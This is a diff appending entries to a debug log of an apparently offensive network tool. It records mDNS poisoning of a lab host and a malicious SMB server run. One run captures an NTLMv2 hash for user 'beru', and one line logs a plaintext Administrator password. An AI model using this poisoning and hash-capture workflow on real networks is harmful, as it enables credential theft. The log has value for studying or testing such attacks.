@@ -1070,3 +1070,869 @@
 2022-03-01 18:43:32.261 | DEBUG    | project.utils.neo.dboperations:__init__:23 - The neo4j dirver has been created successfully
 2022-03-01 18:43:36.331 | DEBUG    | project.utils.scan:do_scan:565 - Starting scan command using user: Administrator passwd: P@$$w0rd! subnet: 127.0.1.1/24
 2022-03-01 18:44:15.923 | DEBUG    | project.utils.neo.dboperations:__init__:23 - The neo4j dirver has been created successfully
+2022-03-02 18:24:24.510 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 18:24:31.673 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:24:31.674 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 18:24:31.692 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 18:24:31.693 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 18:24:31.692 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 18:24:48.251 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:24:48.252 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:84 - Finishing attack in the background ...
+2022-03-02 18:24:48.252 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:84 - Finishing attack in the background ...
+2022-03-02 18:25:00.098 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:25:00.099 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 18:25:00.119 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 18:25:00.119 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 18:25:31.092 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 18:25:39.825 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:25:39.826 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 18:25:39.840 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 18:25:39.840 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 18:25:39.843 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 18:25:44.105 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:8050
+2022-03-02 18:25:44.106 | WARNING  | project.network.mitm.mss:__checking_conditions_for_attack:150 - Error with output file
+2022-03-02 18:25:44.106 | WARNING  | project.network.mitm.mss:__checking_conditions_for_attack:150 - Error with output file
+2022-03-02 18:25:46.619 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:8050
+2022-03-02 18:25:46.620 | WARNING  | project.network.mitm.mss:__checking_conditions_for_attack:150 - Error with output file
+2022-03-02 18:25:46.620 | WARNING  | project.network.mitm.mss:__checking_conditions_for_attack:150 - Error with output file
+2022-03-02 18:41:58.501 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 18:42:00.076 | WARNING  | project.network.mitm.mss:__checking_conditions_for_attack:150 - Error with output file
+2022-03-02 18:42:00.075 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:8050
+2022-03-02 18:42:00.076 | WARNING  | project.network.mitm.mss:__checking_conditions_for_attack:150 - Error with output file
+2022-03-02 18:42:55.199 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 18:43:01.959 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:43:01.959 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 18:43:29.501 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:113 - The attack is already running in the background
+2022-03-02 18:43:29.500 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:43:29.501 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:113 - The attack is already running in the background
+2022-03-02 18:43:32.057 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:8050
+2022-03-02 18:43:32.057 | ERROR    | project.network.mitm.mss:__end_process_in_the_background:124 - Not background process found 
+2022-03-02 18:43:32.057 | ERROR    | project.network.mitm.mss:__end_process_in_the_background:124 - Not background process found 
+2022-03-02 18:43:42.881 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:43:42.882 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:113 - The attack is already running in the background
+2022-03-02 18:43:42.882 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:113 - The attack is already running in the background
+2022-03-02 18:46:27.651 | ERROR    | project.network.mitm.mss:__end_process_in_the_background:124 - Not background process found 
+2022-03-02 18:46:27.651 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:8050
+2022-03-02 18:46:27.651 | ERROR    | project.network.mitm.mss:__end_process_in_the_background:124 - Not background process found 
+2022-03-02 18:46:32.879 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:46:32.879 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:84 - Finishing attack in the background ...
+2022-03-02 18:46:32.879 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:84 - Finishing attack in the background ...
+2022-03-02 18:46:37.811 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:46:37.812 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 18:46:37.828 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 18:46:37.828 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 18:47:02.555 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:47:02.556 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:47:02.557 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 18:47:02.557 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 18:47:02.592 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:47:02.592 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:47:02.593 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 18:47:02.593 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 18:47:02.629 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:47:02.630 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:47:02.632 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:47:02.633 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:47:19.384 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:47:19.384 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:47:19.385 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 18:47:19.385 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 18:47:19.475 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:47:19.475 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:47:19.476 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 18:47:19.476 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 18:47:41.967 | INFO     | project.shell.igris:show_settable_variables_necessary:270 - Showing necessary settable variables
+2022-03-02 18:47:41.966 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:8050
+2022-03-02 18:47:41.967 | INFO     | project.shell.igris:show_settable_variables_necessary:270 - Showing necessary settable variables
+2022-03-02 18:48:08.174 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 18:48:08.175 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 18:48:08.186 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 18:48:08.186 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 18:48:08.188 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 18:48:08.188 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 18:48:08.192 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 18:48:08.192 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 18:48:08.193 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 18:48:08.193 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 18:48:08.201 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 18:48:08.201 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 18:48:10.573 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 18:48:10.573 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 18:48:15.202 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 18:48:15.216 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 18:48:15.203 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 18:48:15.216 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 18:48:15.219 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 18:48:34.477 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 18:48:34.605 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 18:48:34.489 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 18:48:34.605 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 18:48:34.726 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 18:48:34.726 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 18:48:34.729 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 18:48:34.729 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 18:48:34.730 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 18:48:34.730 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 18:48:34.733 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 18:48:34.733 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 18:48:52.014 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:48:52.016 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:48:52.017 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 18:48:52.058 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:48:52.059 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:48:52.060 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 18:48:52.106 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:48:52.106 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:48:52.109 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 18:48:52.109 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 18:48:53.021 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50354)
+2022-03-02 18:48:53.021 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50354)
+2022-03-02 18:48:53.184 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 18:48:53.184 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 18:48:53.187 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 18:48:53.187 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 18:48:53.199 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:77f14b9c51abce583ccd53844714ce8d:010100000000000080d8c829662ed8011df997f59d15fd6200000000010010004d0073004600630054004e007a004300030010004d0073004600630054004e007a004300020010007a006a0058005700680053005a007500040010007a006a0058005700680053005a0075000700080080d8c829662ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900260063006900660073002f0068006f006c00610061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 18:48:53.199 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:77f14b9c51abce583ccd53844714ce8d:010100000000000080d8c829662ed8011df997f59d15fd6200000000010010004d0073004600630054004e007a004300030010004d0073004600630054004e007a004300020010007a006a0058005700680053005a007500040010007a006a0058005700680053005a0075000700080080d8c829662ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900260063006900660073002f0068006f006c00610061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 18:48:53.228 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2022-03-02 18:48:53.228 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2022-03-02 18:48:53.248 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2022-03-02 18:48:53.248 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2022-03-02 18:48:53.328 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 18:48:53.328 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 18:48:58.407 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 18:48:58.407 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:44:12.852 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 19:44:17.240 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:44:17.241 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:44:17.248 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:44:17.248 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:44:17.254 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:44:17.254 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:44:17.257 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:44:17.257 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:44:17.258 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:44:17.258 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:44:17.262 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:44:17.262 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:44:18.455 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:44:18.455 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:44:23.904 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 19:44:23.905 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:44:23.917 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 19:44:23.917 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 19:44:33.362 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:33.363 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:33.363 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:44:33.363 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:44:33.397 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:33.398 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:33.398 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:44:33.398 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:44:33.853 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:33.854 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:33.855 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:33.855 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:34.290 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:34.291 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:34.291 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:44:34.291 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:44:34.327 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:34.328 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:34.328 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:44:34.328 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:44:34.545 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:34.545 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:34.546 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:34.547 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:35.863 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:35.863 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:44:35.865 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:44:35.865 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:25.607 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 19:45:25.607 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:45:25.627 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 19:45:25.627 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 19:45:25.628 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 19:45:26.153 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:26.156 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:26.157 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
